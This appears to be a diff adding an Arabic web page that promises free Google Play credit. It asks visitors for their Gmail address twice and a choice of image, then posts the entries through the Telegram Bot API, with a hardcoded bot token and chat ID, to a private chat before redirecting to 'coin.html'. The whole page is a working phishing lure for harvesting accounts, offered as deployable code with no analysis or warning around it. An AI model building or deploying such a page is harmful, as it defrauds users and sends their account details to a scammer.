@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> شحن مجانا الان</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #1a1a2e;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            padding: 20px;
+        }
+        .logo {
+            width: 180px;
+            margin-bottom: 30px;
+        }
+        .button {
+            background-color: #00aaff;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 20px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .button:hover {
+            background-color: #0088cc;
+            transform: scale(1.05);
+        }
+        .form-section {
+            display: none;
+            text-align: center;
+            margin-top: 30px;
+        }
+        .form-section input {
+            padding: 12px;
+            font-size: 18px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            margin: 10px 0;
+            width: 90%;
+            max-width: 400px;
+        }
+        .form-section input:focus {
+            border-color: #00aaff;
+            outline: none;
+        }
+        .form-section img {
+            width: 120px;
+            margin: 15px 10px;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+        .form-section img:hover {
+            transform: scale(1.1);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
+        }
+        .coin-button {
+            background-color: #00aaff;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 18px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 20px;
+        }
+        .coin-button:hover {
+            background-color: #00aaff;
+            transform: scale(1.05);
+        }
+        .selected {
+            border: 3px solid #00aaff;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="mainSection">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhAabrAk7WDVhTRelysYHHQN3RcZCvwb8nQPFN08tW_qPdmke_q6yiBVVRBVnGPTQ_UKxwPguUNcuKA0DfY4bEyawnxJGD4ObxnSZRdChOy88pN90V15HFgBKB4hutqCmLQ06l2d7DI69cKjWGURY9EBy7l0-ip5hJwnsAhTY90kwDTcYqWAhRBYXXpbOk/s800/Google-Play-10-USD-68776.jpg" alt="الشعار" class="logo">
+        <button class="button" onclick="showForm()"> شحن مجانا الان</button>
+    </div>
+
+    <div class="form-section" id="formSection">
+        <input type="text" id="gameId" placeholder="اكتب Gmail">
+        <input type="text" id="gameName" placeholder="اكتب Gmail مره اخرى">
+        <div id="imageSelection">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhN40qbuU40WvkSlGVfukGhXeacgzcBNx78cyZd23zp3UQYxneAkBucy2Q60ysMi-tOixEFUG3ueOarN-s8B2as6IzuCo6xl32joEL0TdpUxwBKbcl7uaQqC11Q3CuhlRG6L9WDlQBbLUYuaEMFL0ZPZpBzT6NwAh9zYaBma0l3ghkvoClyol90ixCT5nA/s350/IMG_20250128_144810.png" alt="الخيار 1" onclick="selectImage(this)">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgliiOD-Qk3URQ991jBJI2unMl4q4SMeMnyZ2tPFSxjsssZjYEI4ry-O2LYQcQkMrhZmwJEp2IF_drfQbpt5-b04x1NuIyH46-LyLaJfIG9Nb4YS8RVGajM5oxcFQGEmMHYl2IuRaHddo61CBS08zepVyHN4-xktSohDGenwhEvcGQCYzZIn6hyphenhyphenDqBrm98/s350/IMG_20250128_144845.png" alt="الخيار 2" onclick="selectImage(this)">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsd8L3SLXDogOodV2hDhKT4HE7GATLxrQlxumRX3G_5KbarfaDSfGmV4izXOQ8eHPU6NTvk0yf7NkZCiq-HiQUHcSflhvHlIgq4n5x4xBoLlTeTDJzSWH1LcEEOjuqsWIn7NngVkDvGmCxckbQSbNK_m248ZsI914iPHwZNiSlCpZ-jvLsSC88iilrQus/s350/IMG_20250128_144716.png" alt="الخيار 3" onclick="selectImage(this)">
+         
+        </div>
+        <button class="coin-button" onclick="validateAndSend()">التالي</button>
+    </div>
+
+    <script>
+        let selectedImage = null;
+
+        function showForm() {
+            document.getElementById('mainSection').style.display = 'none';
+            document.getElementById('formSection').style.display = 'block';
+        }
+
+        function selectImage(img) {
+            const images = document.querySelectorAll('#imageSelection img');
+            images.forEach(image => image.classList.remove('selected'));
+            img.classList.add('selected');
+            selectedImage = img.alt; 
+        }
+
+        function validateAndSend() {
+            const gameId = document.getElementById('gameId').value.trim();
+            const gameName = document.getElementById('gameName').value.trim();
+
+            if (!gameId) {
+                alert("يرجى كتابة الأيدي الخاص بك!");
+                return;
+            }
+
+            if (!gameName) {
+                alert("يرجى كتابة اسمك في اللعبة!");
+                return;
+            }
+
+            if (!selectedImage) {
+                alert("يرجى اختيار خيار من الصور!");
+                return;
+            }
+
+            // معلومات البوت
+            const botToken = "7841659071:AAGB0vllf_evaUJ23WhlKet8mAGkJofixcQ"; // استبدل بـ توكن البوت
+            const chatId = "5555518543"; // استبدل بـ معرف الدردشة الخاص بك
+            const message = `
+                📝 *معلومات جديدة:*\n
+                🆔 *الأيدي:* ${gameId}\n
+                🎮 *الاسم في اللعبة:* ${gameName}\n
+                🖼 *الخيار:* ${selectedImage}
+            `;
+
+            // إرسال البيانات إلى بوت تلجرام
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: "Markdown"
+                }),
+            })
+            .then(response => {
+                if (response.ok) {
+                    window.location.href = 'coin.html';
+                } else {
+                    alert("حدث خطأ أثناء الإرسال، يرجى المحاولة لاحقًا.");
+                }
+            })
+            .catch(error => {
+                console.error("خطأ:", error);
+                alert("حدث خطأ أثناء الإرسال، يرجى المحاولة لاحقًا.");
+            });
+        }
+    </script>
+</body>
+</html>
